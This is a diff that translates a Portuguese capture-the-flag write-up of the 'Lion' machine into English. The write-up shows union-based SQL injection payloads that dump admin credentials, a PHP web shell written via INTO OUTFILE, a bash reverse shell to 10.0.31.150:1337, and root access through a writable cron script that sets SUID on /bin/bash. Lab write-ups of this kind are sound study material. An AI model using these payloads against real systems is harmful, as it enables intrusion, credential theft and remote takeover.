@@ -1,20 +1,14 @@
 ---
 title: 'Lion Writeup'
 date: '2024-11-07'
-tags: ['SQLI', 'RCE', 'Linux']
+tags: ['SQLI', 'RCE', 'Linux', 'Hacking Club']
 draft: false
-summary: 'A máquina Lion é vulnerável a injeção SQL, permitindo RCE através do upload de uma webshell, e possui escalonamento de privilégios via cron jobs.'
+summary: 'The Lion machine is vulnerable to SQL injection, allowing RCE through the upload of a webshell, and has privilege escalation via cron jobs.'
 images: ['/static/images/lion-writeup-images/default.png']
 authors: ['default']
 ---
 
 ![logo](/static/images/lion-writeup-images/default.png)
-
-## **Plataforma**: Hacking Club
-
-### **Dificuldade:** Easy
-
-### **Nome**: Lion
 
 ---
 
@@ -48,7 +42,7 @@ PORT     STATE SERVICE VERSION
 3306/tcp open  mysql   MariaDB (unauthorized)
 ```
 
-Portas 22 (SSH), 80 (HTTP), 111 (RPC) e 3306 (MySql) Abertas.
+Ports 22 (SSH), 80 (HTTP), 111 (RPC), and 3306 (MySQL) are open.
 
 ---
 
@@ -64,27 +58,27 @@ Portas 22 (SSH), 80 (HTTP), 111 (RPC) e 3306 (MySql) Abertas.
 
 ![lion 1](/static/images/lion-writeup-images/image1.png)
 
-Endpoint `/admin` encontrado via fuzzing; no entanto, não está vulnerável à SQL Injection.
+he `/admin` endpoint was found via fuzzing; however, it is not vulnerable to SQL Injection.
 
-Testei algumas coisas como passar uma aspas simples e credenciais padrões como `admin:admin` mas não obtive sucesso.
+I tried things like passing a single quote and default credentials like `admin:admin`, but I had no success.
 
 ![lion 2](/static/images/lion-writeup-images/image2.png)
 
-Testando SQL Injection no campo de pesquisa.
+Testing SQL Injection in the search field.
 
 ![lion 3](/static/images/lion-writeup-images/image3.png)
 
-`' or 1=1 -- -` retornou todos os posts.
+`' or 1=1 -- -` returned all posts.
 
 ![lion 4](/static/images/lion-writeup-images/image4.png)
 
-Enumerando o número de tabelas existentes com `union select`
+Enumerating the number of tables with `union select`
 
 `' union select 1,2,3,4,5,6 -- -`
 
 ![lion 5](/static/images/lion-writeup-images/image5.png)
 
-Quando testado com 7 colunas, ele funciona e reflete número 2, ou seja, é nessa coluna que devemos injetar.
+When tested with 7 columns, it works and reflects the number 2, meaning this is the column to inject into.
 
 `' union select 1,2,3,4,5,6,7 -- -`
 
@@ -94,7 +88,7 @@ Quando testado com 7 colunas, ele funciona e reflete número 2, ou seja, é ness
 
 ![lion 7](/static/images/lion-writeup-images/image7.png)
 
-Pegando o nome do banco de dados:
+Getting the database name:
 
 `' union select 1,database(),3,4,5,6,7 -- -`
 
@@ -108,19 +102,19 @@ Pegando o nome do banco de dados:
 
 ![lion 10](/static/images/lion-writeup-images/image10.png)
 
-Pegando a senha do admin:
+Getting the admin password:
 
 `' union select 1,concat(AdminUserName,":",AdminPassword),3,4,5,6,7 from tbladmin -- -`
 
 ![lion 11](/static/images/lion-writeup-images/image11.png)
 
-O hash em questão é um Bcrypt, pois começa com `$2`, um dos hashes mais difíceis de quebrar, o que torna inviável um ataque de força bruta.
+The hash is a Bcrypt hash, as it starts with `$2`, which is one of the hardest hashes to crack, making a brute force attack infeasible.
 
 ---
 
 ## Foot Hold
 
-Utilizando o SQL Injection pra ganhar uma web shell.
+Using SQL Injection to get a web shell.
 
 `' union select 1,"<?php system($_GET['cmd']) ?>",3,4,5,6,7 into outfile "/var/www/html/includes/cmd.php" -- -`
 
@@ -132,7 +126,7 @@ Utilizando o SQL Injection pra ganhar uma web shell.
 
 `http://172.16.9.144/includes/cmd.php?cmd=bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1`
 
-OBS: Lembre-se de encodar a payload.
+Note: Remember to encode the payload.
 
 ![lion 14](/static/images/lion-writeup-images/image14.png)
 
@@ -144,15 +138,15 @@ OBS: Lembre-se de encodar a payload.
 
 ## Privillege Escalation
 
-Cron de um script de backup sendo executado pelo root.
+Cron job of a backup script running as root.
 
 ![lion 16](/static/images/lion-writeup-images/image16.png)
 
-Olhando as permissões do script, eu tenho permissão de escrita,leitura e execução.
+Looking at the script's permissions, I have write, read, and execute permissions.
 
 ![lion 17](/static/images/lion-writeup-images/image17.png)
 
-Simplesmente alterei o script para adicionar as permissões especiais no `/bin/bash`, transformando ele em um `SUID` .
+I simply modified the script to add special permissions to **/bin/bash**, making it a **SUID**.
 
 `nano lion.backup.sh`
 
